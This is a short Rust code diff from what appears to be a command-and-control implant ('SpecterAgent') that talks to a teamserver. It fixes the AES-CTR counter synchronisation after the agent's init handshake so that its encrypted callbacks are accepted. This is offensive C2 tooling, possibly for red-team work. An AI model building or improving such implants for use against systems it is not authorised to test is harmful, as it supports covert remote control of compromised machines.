@@ -7,8 +7,7 @@ use tracing::{info, warn};
 use crate::config::SpecterConfig;
 use crate::error::SpecterError;
 use crate::protocol::{
-    self, AgentMetadata, build_callback_packet, build_init_packet, ctr_blocks_for_len,
-    parse_init_ack,
+    AgentMetadata, build_callback_packet, build_init_packet, ctr_blocks_for_len, parse_init_ack,
 };
 use crate::transport::HttpTransport;
 
@@ -84,11 +83,12 @@ impl SpecterAgent {
         // After init, the server encrypted the ACK at offset 0 and advanced by ack_blocks.
         // We decrypted at offset 0 and must advance our recv counter to match.
         self.recv_ctr_offset = ack_blocks;
-        // The init metadata was encrypted at offset 0 by us.  The server decrypted it
-        // at offset 0 and advanced by the metadata ciphertext length.
-        // Our send counter advances by the same amount.
-        let metadata_plaintext = protocol::serialize_init_metadata_len(self.agent_id, &metadata);
-        self.send_ctr_offset = ctr_blocks_for_len(metadata_plaintext);
+        // The teamserver uses decrypt_agent_data (CTR always at 0) for DEMON_INIT and
+        // inserts the agent with ctr_block_offset = 0.  It then advances by exactly 1 block
+        // when building the init ACK (4-byte payload → 1 block).  So after init the server's
+        // stored CTR = ack_blocks (= 1).  Our send counter must match that same value so
+        // the first callback is encrypted at the offset the server expects.
+        self.send_ctr_offset = self.recv_ctr_offset;
 
         info!(
             agent_id = format_args!("0x{:08X}", self.agent_id),
